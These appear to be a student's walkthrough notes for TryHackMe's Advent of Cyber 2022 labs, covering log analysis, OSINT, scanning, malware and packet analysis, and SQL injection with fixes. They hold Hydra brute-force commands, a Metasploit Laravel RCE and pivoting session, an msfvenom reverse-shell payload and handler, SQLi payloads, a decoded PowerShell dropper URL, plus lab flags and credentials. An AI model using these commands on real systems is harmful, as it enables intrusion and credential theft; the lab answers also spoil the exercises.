
## DAY 1 - Frameworks 

CYBER KILL CHAIN

Getting inside:
1. recon 
2. weaponization
3. delivery of payloads
4. social engineering
5. exploitation
6. installation / persistence / defence evasion
7. command & control
8. actions on objectives

Getting through:
1. pivoting 
2. discovery 
3. privilege escalation
4. execution 
5. credential access
6. lateral movement 

Getting out:
Confidentiality Integrity & Availability (CIA)
1. collection of data and info
2. exfiltration 
3. impact interrupt and sabotage 
4. objectives 


  
Who is the adversary that attacked Santa's network this year?
- The Bandit Yeti 
What's the flag that they left behind?
- ` THM{IT'S A Y3T1 CHR1$TMA$} `


---

## DAY 2 -  Santa's Log

LOG FILES

Log files are files that contain historical records of events and other data from an application. Some common examples of events that you may find in a log file:  

- Login attempts or failures
- Traffic on a network
- Things (website URLs, files, etc.) that have been accessed
- Password changes
- Application errors (used in debugging)
- _and many, many more_

historical record
- what happened
- when, where, who, result?

Logs usually have 
- timestamp of events
- name of the service that is generating the log file

Windows Event Viewer 
- application 
- security
- setup 
- system 

Linux 
- `/var/log` 
- Authentication  `auth.log`  usually attempted remotely or on system for auth
- Package Management `dpkg.log` installing a package , good for debugging
- Syslog all events in system background (crontabs), good for debugging
- Kernel  all events for kernel events on system (output by devices, networking equip) `kern.log`
- 
Tools such as Splunk are software solutions known as Security Information and Event Management (SIEM) is dedicated to aggregating logs for analysis.

GREP
- `grep "x.x.x.x" access.log `
- grep a name, file name, user account, IP , timestamp/ date 
- `grep -i "hello" log.txt `
- `grep -E "tryhackme|thm" log.txt `
- `grep -r "hello" mydirectory`

` 10.10.77.175 `
`elfmcblue : tryhackme!`
`ssh elfmcblue@10.10.77.175`

How many log files are present ?
- 2
Elf McSkidy managed to capture the logs generated by the web server. What is the name of this log file?
- `webserver.log`


On what day was Santa's naughty and nice list stolen?
- `grep "santa" webserver.log`
-  `18/Nov/2022   /santaslist.txt`  => Nov 18 2022 = friday

What is the IP address of the attacker?
- `10.10.249.191`

What is the name of the important list that the attacker stole from Santa?
- `santaslist.txt`

Look through the log files for the flag. The format of the flag is: THM{}
- `grep -E THM{ SSHD.log`
- `THM{STOLENSANTASLIST} `

## DAY 3 - OSINT 

`santagift.shop` website 

**Learning Objectives**
- What is OSINT, and what techniques can extract useful information against a website or target?
- Using dorks to find specific information on the Google search engine
- Extracting hidden directories through the Robots.txt file
- Domain owner information through WHOIS lookup
- Searching data from hacked databases
- Acquiring sensitive information from publicly available GitHub repositories

GOOGLE DORKING
- `inurl: <term>` 
- `filetype: pdf 'hacking' `
- `site: tryhackme.com `
- `cache: tryhackme.com`

`site: github.com "DB_PASSWORD"`  for possible database credentials

`WHOIS` Lookup
WHOIS database stores public domain information such as registrant (domain owner), administrative, billing and technical contacts in a centralized database.
- personal ID info
- spear phishing 

Robots.txt
`haveibeenpwned?`
searching Github repos 

  
What is the name of the Registrar for the domain `santagift.shop`
- `whois santagift.shop`
- `namecheap inc`

Find the website's source code (repository) on [github.com](https://github.com/) and open the file containing sensitive credentials. Can you find the flag?
- `santagift.shop`
- `config.php`
- ` {THM_OSINT_WORKS} `

What is the name of the file containing passwords?
- `config.php`

What is the name of the QA server associated with the website?
- `qa.santagift.shop`

What is the DB_PASSWORD that is being reused between the QA and PROD environments?
- `S@nta2022`


## DAY 4 - Scanning 

Scanning is a set of procedures for identifying live hosts, ports, and services, discovering the operating system of the target system, and identifying vulnerabilities and threats in the network.

passive scanning = indirect scanning a network, usually carried out through packet capture and analysis tools like Wireshark;

**Active Scanning**: Active scanning is a scanning method whereby you scan individual endpoints in an IT network to retrieve more detailed information

- **Closed Ports**: The host is not listening to the specific port.
- **Open Ports**: The host actively accepts a connection on the specific port.
- **Filtered Ports**: This indicates that the port is open; however, the host is not accepting connections or accepting connections as per certain criteria like specific source IP address.

` 10.10.143.28 `

` nmap -sS 10.10.143.28 `

```
22/ ssh
80/ http
139/ netbios-ssn
445/ microsoft-ds

nmap -O returns as TCP/IP fingerprint

nmap -sV

22/ ssh OpenSSh 7.6p Ubuntu
80/ http Apache https 2.4.29
139/ netbios-ssn Samba smbd 3.x
445/ netbios-ssn Samba smbd 3.x

nikto -host 

```

a Samba service running - hackers can gain access to the system through loosely protected Samba share folders that are not protected over the network. He knows that The Bandit Yeti APT got a few lists of admin usernames and passwords for `qa.santagift.shop` using OSINT techniques.

` smb://10.10.143.28 `
` ubuntu : S@nta2022 `

open root's home folder, replace `/root` in the Location with `smb://IP`
then Admins > Registered User > credentials 

What is the name of the HTTP server running on the remote host?
- `Apache`
What is the name of the service running on port 22 on the QA server?
- `ssh`
What flag can you find after successfully accessing the Samba service?
- ` {THM_SANTA_SMB_SERVER} `
  
What is the password for the username santahr?
- ` santa25 `


## Day 5 - Brute Force

The need for remote administration of computer systems led to the development of various software packages and protocols. We will mention three examples:

1. SSH = secure shell 
2. RDP = remote desktop protocol GUI Windows OS
3. VNC = virtual network computing GUI any OS

AUTHENTICATION
- something you know (passwords, PIN)
- something you have (hard/software/phone)
- something you are (biometrics) 

` 10.10.57.239 `

Hydra
`hydra -l username -P wordlist.txt IP service` 
service can be `rdp, vnc, ftp, pop3`

- `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.57.239 ssh`
- `hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://10.10.57.239`

`hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://10.10.57.239 -V`
- ` alexander : sakura `

AttackBox > Applications > Internet > Remmina > cancel keyring 
change drop down to VNC 
`vnc 10.10.57.239` > password ?

`hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.57.239 `
- password ` 1q2w3e4r `
- ` THM{I_SEE_YOUR_SCREEN} `

## Day 6 - Email analysis

email header sections , tools for email attachments

Email analysis is the process of extracting the email header information to expose the email file details. The email header contains the technical details of the email like sender, recipient, path, return address and attachments.

- security issues = ID suspicious / abnormal patterns
- performance issues = ID delivery and delay issues in emails
- social engineering = psychological manipulations of people into performing / divulging info by exploiting weaknesses
- phishing 

Fields 
- from, to , date, subject, return path
- Domain Key and DKIM Signatures = email signatures by email service to ID and authenticate emails
- SPF shows server that was used to send the email (specific domain)
- message-ID = unique ID of the email
- MIME version = the delivered 'non-text' contents & attachments
- X-headers = mail providers add these fields 
- X-received = mail server that the email went through
- X-spam status = spam score of the email
- X-mailer = email client name

RED FLAGS 
- invalid email addresses (from, to, cc)
- same sender & recipient (from, to)
- different values in 'from' and 'return path'
- email sent from official mail servers
- Message-ID is empty or malformed
- hyperlinks redirect to abnormal sites

(Firefox) Mail Header Analysis Tool (MHA)
`.eml` or `.msg` open in text editor
if using text file select the Email Header option

`emlAnalyzer`
- `-i /path/fileName ` file to analyze
- `--header` show header
- `-u` show urls
- `--text` show text data
- `--extract-all` extract all attachments

check the safety of email: https://emailrep.io/
- virustotal
- InQuest https://labs.inquest.net/
- IPinfo . io
- Talos Reputation
- Browserling 
- Wannabrowser 

**Note:** Remember to navigate to the file's location before attempting to calculate the file's hash value.

1. `sha245sum FileName`
2. `virustotal` search and paste in the hash
3. **Tool:** `https://labs.inquest.net/` indicator lookup

---
inside the AoC_2022 window 
`Urgent:.eml` open in Sublime text

```
X-Pm-Content-Encryption: end-to-end
X-Pm-Origin: internal
Subject: Urgent: Blue section is down. Switch to the load share plan!
From: Chief Elf <chief.elf@santaclaus.thm>
Date: Tue, 6 Dec 2022 00:00:01 +0000
Mime-Version: 1.0
Content-Type: multipart/mixed;boundary=---------------------03edd9c682a0c8f60d54b9e4bb86659f
To: elves.all@santaclaus.thm <elves.all@santaclaus.thm>
X-Attached: Division_of_labour-Load_share_plan.doc
Message-Id: <QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==>
X-Pm-Spamscore: 3
Received: from mail.santaclaus.thm by mail.santaclaus.thm; Tue, 6 Dec 2022 00:00:01 +0000
X-Original-To: elves.all@santaclaus.thm
Return-Path: <murphy.evident@bandityeti.thm>
Delivered-To: elves.all@santaclaus.thm

...

Content-Type: application/msword; filename="Division_of_labour-Load_share_plan.doc"; name="Division_of_labour-Load_share_plan.doc"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Division_of_labour-Load_share_plan.doc"; name="Division_of_labour-Load_share_plan.doc"
```

`emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all`

copy return path `murphy.evident@bandityeti.thm` into `emailrep.io` = risky

What is the email address of the sender?
- ` chief.elf@santaclaus.thm `
What is the return address?
- ` murphy.evident@bandityeti.thm `
On whose behalf was the email sent?
- ` chief elf `
What is the X-spam score?
- 3
What is hidden in the value of the Message-ID field?
- ` AoC2022_Email_Analysis `

```
<span>Dear Elves,</span><div><br></div><div><span>Due to technical problems in the blue section of our toy factory, we are having difficulties preparing some toys. </span></div><div><br></div><div><span>There
 are a few days left to Christmas, so we need to use time efficiently to
 prepare every wishlist we receive. Due to that, the blue section's 
workload is shared with the rest to avoid any toy production delay.</span></div><div><br></div><div><span>The detailed division of labour is included in the attached document.
```


cd to `eml_attachments`
`sha256sum Division_of_labor-Load_share_plan.doc `
` 0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467 `
paste in `virustotal.io` 
score of 32 as malicious code 


  
Visit the email reputation check website provided in the task.  
What is the reputation result of the sender's email address?
- `risky `

Visit the Virus Total website and use the hash value to search.  
Navigate to the behaviour section.  
What is the second tactic marked in the `Mitre ATT&CK` section?
- ` defense evasion `

  
Visit the InQuest website and use the hash value to search.  
What is the subcategory of the file?
- copy ` 0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467 `
-  https://labs.inquest.net/
- Indicator Lookup and paste
- Subcategory = ` macro_hunter `


## Day 7 - CyberChef 

1. open AttackBox browser > CyberChef > drag & drop the `Division_of_labour-Load_share_plan.doc`
2. extract strings > print all characters > min length of characters to 258
3. find/ replace > regex pattern `[\[\]\n_]`  which reveals 

```
cmd cmd cmd cmd /c msg %username% /v Word experienced an error trying to open the file. & P^Ow^er^she^L^L -w hidden -ENCOD 
```

4. drop bytes > length 124 which shows

```
UwBFAFQALQBWAGEAcgBJAEEAQgBsAGUAIAAgADgAaQBoADUANgA3ACAAIAAoACAAIABbAHQAWQBwAGUAXQAoACIAewAzAH0AewAwAH0AewA0AH0AewAyAH0AewAxAH0AIgAtAGYAJwBZAHMAVAAnACwAJwBSAGUAYwBUAE8AUgB5ACcALAAnAE0ALgBpAE8ALgBEAEkAJwAsACcAcwAnACwAJwBlA ...
```

5. From base64  which shows

```
S.E.T.-.V.a.r.I.A.B.l.e. . .8.i.h.5.6.7. . .(. . .[.t.Y.p.e.].(.".{.3.}.{.0.}.{.4.}.{.2.}.{.1.}.".-.f.'.Y.s.T.'.,.'.R.e.c.T.O.R.y.'.,.'.M...i.O...D.I.'.,.'.s.'.,.'.e.'.).).;. . . .S.E.T.-.I.t.e.m.  
...
```

6. Decode text > Unicode UTF-16LE

```
SET-VarIABle  8ih567  (  [tYpe]("{3}{0}{4}{2}{1}"-f'YsT','RecTORy','M.iO.DI','s','e'));   SET-Item ("vA"+"RiA"+"bLe:R"+"i"+"7xO3") ([TyPe]("{2}{5}{4}{3}{1}{0}"-F 'R','MaNaGE','S','VIcEPoInt','.neT.sEr','Ystem') )  ; 
...
```

7. Find/ replace > regex pattern `['()+'"`]` 

```
SET-VarIABle  8ih567    [tYpe]{3}{0}{4}{2}{1}-fYsT,RecTORy,M.iO.DI,s,e;   SET-Item vARiAbLe:Ri7xO3 [TyPe]{2}{5}{4}{3}{1}{0}-F
...
```

8. find/ replace > regex pattern ` ]b2H_`  replace with `http`

```
K_9O;$O66G=F88W;$Cyg0ku7=$HOMEeAwRr1sj9aeAwBcx4iayeAw -repLACeeAw,[chaR]92$Pa2nur4.dll;$E01B=R7_S;$Mrkjcim=https://cdn.bandityeti.thm/files/mysterygift.exe@https://google.com/@https://www.secretSanta.THM/Goldenticket/THM_MYSTERY_FLAG@https://cdn.bandityeti.THM/files/index/. 
...
```

9. extract urls

```
https://cdn.bandityeti.thm/files/mysterygift.exe@https://google.com/@https://www.secretSanta.THM/Goldenticket/THM_MYSTERY_FLAG@https://cdn.bandityeti.THM/files/index/
```

10. split >  @   `\n` 
11. defang url

```
hxxps[://]cdn[.]bandityeti[.]thm/files/mysterygift[.]exe
hxxps[://]google[.]com/
hxxps[://]www[.]secretSanta[.]THM/Goldenticket/THM_MYSTERY_FLAG
hxxps[://]cdn[.]bandityeti[.]THM/files/index/
```

  
What is the version of CyberChef found in the attached VM?
- 9.49.0

How many recipes were used to extract URLs from the malicious doc?
- 10
  
We found a URL that was downloading a suspicious file; what is the name of that malware?
- `mysterygift.exe`

What is the last defanged URL of the `bandityeti` domain found in the last step?
- ` hxxps[://]cdn[.]bandityeti[.]THM/files/index/ `

  
What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>)
- ` THM_MYSTERY_FLAG `


## Day 8 - Smart Contracts


BLOCKCHAIN

a blockchain is a digital database or ledger distributed among nodes of a peer-to-peer network. The blockchain is distributed among "peers" or members with no central servers, hence "decentralized." Due to its decentralized nature, each peer is expected to maintain the integrity of the blockchain. If one member of the network attempted to modify a blockchain maliciously, other members would compare it to their blockchain for integrity and determine if the whole network should express that change.
- cryptography is employed to negotiate transactions and provide utility to the blockchain.
- focus on how data is transferred and negotiated
### Smart Contracts
Smart contracts are most commonly used as the backbone of DeFi applications (Decentralized Finance applications) to support a cryptocurrency on a blockchain. DeFi applications facilitate currency exchange between entities; a smart contract defines the details of the exchange.

SMART CONTRACT FUNCTIONALITY
Smart Contracts are like a Class object, it can be private or public and has several functions such as checking balances, depositing and withdrawing currency. 
- once a contract is deployed on blockchain another contract can use it's functions

```

# we own Contract A, all currency is in ETH
Contract_A = {total_balance: 200}

# Contract B deposits 1 ETH and withdraws 1 ETH from Contract A
Contract_B = {total_balance: 1}
Contract_B = {withdraw_amt_for_Contract_A: 1}
Contract_B = {total_balance: 0}

Contract_A = {total_balance: 200, Contract_B_balance: 1}
```

predetermined conditions are checked
```
Contract_A = {total_balance: 200, Contract_B_balance: 1}

if (Contract_B_balance > 0):
   send( $ETH, Contract_B )
   return Contract_B$balance  # shows 0

Contract_B = {total_balance: 1}
```

Contract_B goes from 1, 0 and back to 1 for balance as the only check is if balance is > 0 as Smart Contracts can make calls asynchronously while the condition function is executing
- Fix = modify the function logic to remove the balance _before_ another call can be made
-  re-entrancy occurs when a malicious contract uses a fallback function to continue depleting a contract's total balance due to flawed logic after an initial withdraw function occurs.

### Practical Application

for this task use the Remix IDE https://remix.ethereum.org/ 
for testing and deploy contracts (practice)

the deploy and run transaction menus
import files: file explorer > default workspace > load local file > select `.sol` files
- `EtherStore.sol` Best Festival Company
- `Attack.sol` malicious contract that tries the re-entry exploit 

What flag is found after attacking the provided EtherStore Contract?
- ` flag{411_ur_37h_15_m1n3} `


## Day 9 - Pivoting

after Metasploit exploit
```
sessions

sessions -u -1

sessions -i session_id

background
```

Meterpreter
```
sysinfo

upload local_file.txt

resolve remote_service1 remote_service2
```

Pivoting
Once an attacker gains initial entry into a system, the compromised machine can be used to send additional web traffic through - allowing previously inaccessible machines to be reached.

use Kali Box
`msfconsole`

Metasploit
```
msf6> search <module>
msf6> use path/to/thing
msf6> exploit(path/to/thing) > info

show options
set rhost MACHINE_IP
set verbose true
set lhost LISTEN_IP
show options
check
run

---
msf6> use admin/postgres/postgres_sql
msf6> auxiliary(admin/postgres/postgres_sql) > run


-- pivot
route [add/remove] subnet netmask [comm/sid]
route add 172.17.0.1/32 -1

route print

--- socks proxy
use auxiliary/server/socks_proxy
run srvhost= 127.0.0.1 srvport= 9050 version= 4a

curl --proxy socks4a://localhost:9050 http:MACHINE_IP

proxychains -q nmap -n -sT -Pn -p 22,80,5432 MACHINE_IP

```

Challenge
`nmap -T4 -A -Pn 10.10.104.73 `

port 22 ssh OpenSSH open
supposed to have port 80 open

`http://10.10.104.73:80 ` inspect > network > cookie `lavarvel_session` cookie

```
msfconsole

search laravel  # returns 2 options

use exploit/multi/php/ignition_laravel_debug_rce

set RGOST 10.10.126.2 lhost= 10.10.55.166 HttpClientTimeout=20

run 

whoami  # returns www-data
background  > y
sessions   shows our shell cmd/unix

sessions -u -1
sessions
sessions -i -1

cat /var/www/.env   returns sensitive info
resolve webservice_database

----------
cve 2021-3129
sessions -u -1
/.dockerenv
.env
users
P4$$w0rd
22,80
THM{47C61A0FA873BA77308A8A600F88E4B}


```


## Day 10 - Hack a game

Cetus is a simple browser plugin that works for Firefox and Chrome, allowing you to explore the memory space of Web Assembly games that run in your browser.
- The main idea behind it is to provide you with the tools to easily find any piece of data stored in memory and modify it if needed.
- modify game's compiled code and alter its behaviour 
- installed in Chrome in AttackBox

`http://127.0.0.1` > dev tools >  `>>` Cetus > reload page > see a panel

number from 1 to 99,999,999 
40546  answer was 75080393, 36539426
in panel: 36539426 EQ i32 yes
1 result: `0x0004ea34` value `0x22d8c22` > Bookmarks
convert number from hex 
36539426

go back and talk with guard and see the hex code change, convert hex number
`33809909`


now on bridge
differential search
panel delete previous number > enter = 458753 results (memory addresses)

LT i32 yes = 44  i get 22 have decreased in value
GT i32 yes = 26 i get 9

`THM{5_star_Fl4gzzz} `
`THM{yetiyetiyetiflagflagflag}`


## Day 11 - Memory Forensics

Volatility is an open-source memory forensics toolkit written in Python. Volatility allows us to analyse memory dumps taken from Windows, Linux and Mac OS devices and is an extremely popular tool in memory forensics. For example, Volatility allows us to:

- List all processes that were running on the device at the time of the capture
- List active and closed network connections
- Use Yara rules to search for indicators of malware
- Retrieve hashed passwords, clipboard contents, and contents of the command prompt
- And much, much more!

`python3 vol.py -h`

```
python3 vol.py -f /path/to/memorydump.vmem

python3 vol.py -v 

python3 vol.py -p /path/to/plugins

python3 vol.py -o /output/extracted/files
```

now we need to decide what we want to analyse the image for. Volatility uses plugins to perform analysis, such as:

- Listing processes
- Listing network connections
- Listing contents of the clipboard, notepad, or command prompt
- And much more! If you're curious, you can read the documentation [here](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.html)

In this task, we are going to use Volatility to:
1. See what Operating System the memory dump is from
2. See what processes were running at the time of capture
3. See what connections were being made at the time of capture

PLUGINS
```
windows.plist  shows what processes were running on the system

windows.psscan  analyze specific process

windows.dumpfiles  analyze static or dynamic binary

windows.netstat   lists all network connections
```

`python3 vol.py -f workstation.vmem windows.info `

`python3 vol.py -f workstation.vmem windows.pslist`

`python3 vol.py -f workstation.vmem windows.psscan`

`python3 vol.py -f workstation.vmem windows.dumpfiles`


---
  
What is the Windows version number that the memory image captured?
- `windows.info`
- 10
  
What is the name of the binary/gift that secret Santa left?
- `windows.pslist`
- ` mysterygift.exe `

What is the Process ID (PID) of this binary?
- `windows.psscan`
- 2040

Dump the contents of this binary. How many files are dumped?
- `windows.dumpfiles`
- `--pid 2040`
- 16

## Day 12 - Malware Analysis

Before touching the malware sample for this task, we need to briefly introduce common malware behaviours to have a good perspective on what to expect in handling malware samples

- Network connections - malware tends to establish a connection externally or internally for downloading staged payloads
- registry key modifications - malware uses registry kets to establish persistence, to keep longer term access and executes when user logs in etc
- file manipulations - malware tends to download  or create new files needed for its successful execution

**WARNING**: **Handling a malware sample is dangerous. Always consider precautions while analyzing it.**

- ALWAYS ASSUME IT WILL INFECT YOUR DEVICE
- only run the malware sample in a controlled environment that prevents potential compromise of unwanted assets
- always use a sandbox!  FlareVM (Start Machine)

`10.10.103.25 `
`administrator : letmein123! `

**Static Analysis** is a way of analysing a malware sample without executing the code. This method mainly focuses on profiling the binary with its readable information, such as its properties, program flow and strings.

**Dynamic Analysis** mainly focuses on understanding the malware by executing it in a safe environment, such as a Sandbox.

Windows OS
Desktop > Malware Samples/ `mysterygift `> right click > open in easy 
select Strings button
Open Powershell
`cd "Desktop\Maware Sample"`
`capa mysterygift`

inside the Detect it Easy window > UPX file
powershell `upx -d mysterygift`  now has `.viv` file in directory but delete it
`del mysterygift.viv
`capa mysterygift`

open Process Monitor
inside the filter window: drop down `Process Name` `mystergygift.exe` > Add, Apply > ok
Powershell > `mv mysterygift mysterygift.exe`

inside the Malware Sample folder > click on the `.exe`

`HKCU\Software\Microsoft\Windows\CurrentVersion\run`

`C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat `

`test.jpg, wishes.bat`

`bestfestivalcompany.thm, virustotal.com `

`http://bestfestivalcompany.thm/favicon.ico `

## Day 13 - Packet Analysis

Packets are the most basic unit of the network data transferred over the network. When a message is sent from one host to another, it is transmitted in small chunks; each called a packet. Packet analysis is the process of extracting, assessing and identifying network patterns such as connections, shares, commands and other network activities, like logins, and system failures, from the prerecorded traffic files.

Network & Standard protocols 
- MUST know, need to know what is 'normal', 'abnormal', and patterns

Attack & defence concepts
- must know how the attacks are conducted to ID what is happening

use tools to find specific information

1. Hypothesis - have an idea what you are looking for
2. packet stats - stats from a capture file shows protocols, endpoints, conversations
3. known services - browsing/file sharing/email= services, need to know what "normal" looks like
4. unknown services - red flags! research unknown protocols & services
5. known patterns - know the most common and recent case patterns
6. environment - know the IP address blocks, hostname, username structure, used services, external resources, maintenance schedules, avg traffic load

WIRESHARK
Stats > Protocol Hierarchy
Stats > Conversations > IPv4

This information will help us identify suspicious IP addresses, connections and ports. Analyze the details carefully; we may discover the IP addresses and services used by the Bandit Yeti APT!



packet stats 
service ID
IP reputation

**Questions to answer**
- Which IP addresses are in use?
- Has a suspicious IP address been detected?
- Has suspicious port usage been detected?
- Which port numbers and services are in use?
- Is there an abnormal level of traffic on any port or service?


filter: `http`
source: `10.10.29.186  GET /mysterygift.exe HTTP/1.1` 
User-Agent: Mozilla/5.0
`http://cdn.bandityeti.thm/mysterygift.exe `

source: `10.10.29.186 GET /favicon.ico HTTP/1.1`
`http://bestfestivalcompany.thm/favicon.ico `

`10.10.114.77`  `image/vnd.microsoft.icon`

File > Export objects > HTTP > save all > close
Terminal: `sha256sum mystergygift.exe  `
virustotal 
`0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f `

---
What is the "Percent Packets" value of the "Hypertext Transfer Protocol"?
- 0.3

Which port number has received more than 1000 packets?
- Stats > Conversations > TCP
- `3389`

What is the service name of the used protocol that received more than 1000 packets?
- `rdp`

Enter the domains in alphabetical order and defanged format.
- ` bestfestivalcompany[.]thm `
- `cdn[.] bandityeti[.]thm ` 

Enter the names in alphabetical order and in defanged format.
- ` favicon[.]ico `
- ` mysterygift[.]exe `

Which IP address downloaded the executable file?
- `10[.]10[.]29[.]186 `

Which domain address hosts the malicious file?
- ` cdn.bandityeti.thm `

What is the "user-agent" value used to download the non-executable file?
- `Nim httpclient/1.6.8 `


Export objects from the PCAP file.  
Calculate the file hashes.
What is the sha256 hash value of the executable file?
- back to virustotal > Details >  sha256
- ` 0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f `


We know IP addresses starting with 20[.], and 23[.] are associated with Bandit Yeti APT.  
What are the connected IP addresses in the mentioned pattern?  
Enter the IP addressed defanged and in numerical order
```
 20[.]99[.]133[.]109 , 
 20[.]99[.]184[.]37 , 
 23[.]216[.]147[.]64,
 23[.]216[.]147[.]76
```


## Day 14 - Web Apps

the local web application suffers from an Insecure Direct Object References (IDOR) vulnerability.

Database 
tables: `products, customer_details, purchases`

IDOR
` http://santagift.shop/account/user_id=132 `

` http://santagift.shop/invoices?download=115 `

` http://santagift.shop/account/changepassword=yeti `

` http://10.10.58.202:8080 `
`mcskidy : devtest `

```
/users/101 = Elf McSkidy
/users/102 = Elf Log McBlue
/users/103 = Elf Forensic McBlue
/users/104 = elf admin mcBlue
/users/105 = elf pivot mcRed  office number: 134

```

click on image > open in new tab, edit the page number

`/images/100.png`  = `THM{close_the_door} `


## Day 15 - Secure coding

LPORT=8888
LHOST= 10.10.197.65
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.197.65 LPORT=8888 -f exe -o cv-username.exe
```

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.197.65; set LPORT 8888; exploit"
```

upload the cv-username.exe
wait for reverse shell  `meterpreter>`
cd ..
pwd
`meterpreter help` 
- `hashdump`
- `screenshot`
- `getuid`  = `santasidekick\HR_Elf`

`cd inetpub`
`cd wwwroot`
`cd Santa`
`cd Uploads`
`cd Users`
`cd HR_Elf`
`cd Documents`

` THM{naughty.file.uploads.can.get.you.rce} `

## Day 16 - SQLi

**Structured Query Language (SQL)** is the traditional language used to ask databases for information.  MySQL stores information in structures called tables. Think of them as any table in a spreadsheet document where you have **columns** and **rows**.

data table `toys`
SQL 
- `SELECT * FROM toys;`
- `SELECT name, quantity FROM toys;`
- `SELECT name, quantity FROM toys WHERE quantity >= 20;`

SQL from PHP

1. connect to the database  the `msqli` extension:  `mysqli_connect()`
2. enter the IP or name of database server as 1st parameter `$server`
3. username `$user`
4. password `$pwd` 
5. schema `$schema`

```php
$server="db";
$user="logistics_user";
$pwd="somePass123";
$schema="logistics";

$db=mysqli_connect($server,$user,$pwd,$schema);
```

once connected
```php
$query="select * from users where id=1";
$elves_rs=mysqli_query($db,$query);
```

Websites
`.com/webapp/elf.php?id=2`

```php
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```

SQLi
```sql
select * from users where id=-1 OR id = 4
```
` http://10-10-7-237.p.thmlabs.com/webapp/elf.php?id=2 OR id=4`
returns Elf Recon McRed profile

` http://10-10-7-237.p.thmlabs.com/webapp/elf.php?id=-1 union all select null,null,username,password,null,null,null from users `
returns `H0hoh02022` full stack Elf which has all users


`http://10-10-7-237.p.thmlabs.com`
` coder : coder `


Fixing SQLi -- data type validation

elf.php
```php
# lines 4,5
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);

# avoid attacks: input as integer
intval("123") = 123
intval("hacker") = 0

# -- safer code
$query="select * from users where id=".intval( $_GET['id'] );
$elves_rs=mysqli_query($db,$query);

```

Flag1 ` THM{McCode, Elf McCode} `


Fixing SQLi --- prepared statements

search-toys.php
```php
$query="select * from toys where name like '%".$_GET['q']."%' or description like '%".$_GET['q']."%'";
$toys_rs=mysqli_query($db,$query);

# SELECT * FROM toys WHERE name LIKE '%car%' OR description LIKE '%car%'


$query="select * from toys where name like ? or description like ?";
$stmt = mysqli_prepare($db, $query);

#-- safer code
$q = "%".$_GET['q']."%";
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);

mysqli_stmt_execute($stmt);

$toys_rs=mysqli_stmt_get_result($stmt);

```

```
$q = "%".$_GET['q']."%";
$query="select * from toys where ? or description like ?";
$stmt = mysqli_prepare($db, $query);
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
mysqli_stmt_execute($stmt);
$toys_rs=mysqli_stmt_get_result($stmt);

```

Flag 2 ` THM{KodeNRoll} `

SQL vuln:  `id=1 or 1=1 limit 4,1`
toy.php
```
$query="select * from users where id=".intval( $_GET['id'] );

```

Flag 3 ` THM{are we secure yet? } `

another vuln `username ` OR 1=1-- x
login.php using `$_POST[]` for user and password

```PHP
if(isset($_POST['username']) && isset($_POST['password'])){
	$username=$_POST['username'];
	$password=$_POST['password'];
	$query="select * from users where username='".$username."' and password='".$password."'";
	$users_rs=mysqli_query($db, $query);
	if(mysqli_num_rows($users_rs)>0)
	{
		$_SESSION['username']=$username;
		echo "<script>window.location='admin.php';</script>";
	}
	else
	{
		$message="Incorrect username/password found!";
		echo "<script type='text/javascript'>alert('$message');</script>";
	}
}
```

secure it with prepared statements
```
$query="select * from users where username=? and password=?;
$stmt = mysqli_prepare($db, $query); 
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$users_rs=mysqli_stmt_get_result($stmt)
```

Flag3 ` THM{SQLi_who???} `




## Day 17 - Filtering 

Input validation
HTML & Regex `<input>`
```
<input type="text" id="uname" name="uname" pattern="[a-zA-Z0-9]+">  

<input type="email" id="email" name="email" pattern=".+@tryhackme\.com">
```

- match 1 char `[aeiou]`  `[a-zA-Z]`  `[a-z0-9]`
- wildcard `*` matches any char 
- anchors `^` and `$` start and end of string to match
- `{min, max}`
- match lowercase of length 3 to 9 `^[a-z]{3,9}$`
- string starts with 3 letters followed by any 3 chars `^[a-zA-Z]{3}.{3}$`
- grouping `www.tryhackme.com and tryhackme.com` ==> `^(www\.)?tryhackme\.com`

Free Form Text

```
# --- not secure
<html>
<input name="name" placeholder="Mx Hacker"><br>
<input name="birthday" placeholder="January 1, 1999"><br>

#-- input validation
<input type="text" name="name" placeholder="Mx Hacker"><br>
<input type="date" name="birthday"><br>

#-- better validation
<input type="text" name="name" placeholder="Mx Hacker" required minlength="4" size="30"><br>
<input type="date" name="birthday" min="1900-01-01" max="2014-12-31"><br>
```

Client-side vs Server-side
PHP has function `htmlentities()` which escapes any character that can effect the application
`$name = htmlentities($_GET['name'], ENT_QUOTES | ENT_HTML5, "UTF-8"`
or use `HTMLPurifier` library 


`cd ~/Desktop/RegExPractice` or `egrep 'regex_pattern_here' strings`
`regex_checker.py`

`egrep 'a' strings`

filtering for usernames min 6 max 12 chars upper & lower

Filtering for Usernames: How many usernames fit the syntax above?
- `^[a-zA-Z0-9]{6,12}$ `
- `egrep '^[a-zA-Z0-9]{6,12}$' strings`
- 8

Filtering for Usernames: One username consists of a readable word concatenated with a number. What is it?
- user35

Filtering for Emails: Follows the form "local-part@domain" (without quotation marks); local-part is a random string, and the domain is in the form of `"<domain name>.tld"`. All top-level domains (`tld`) are ".com"

  
Filtering for Emails: How many emails fit the syntax above?
- wildcard `\.`  `+` 
- `egrep '^.+@.+\.com' strings | wc -l`
- 11

Filtering for Emails: How many unique domains are there?
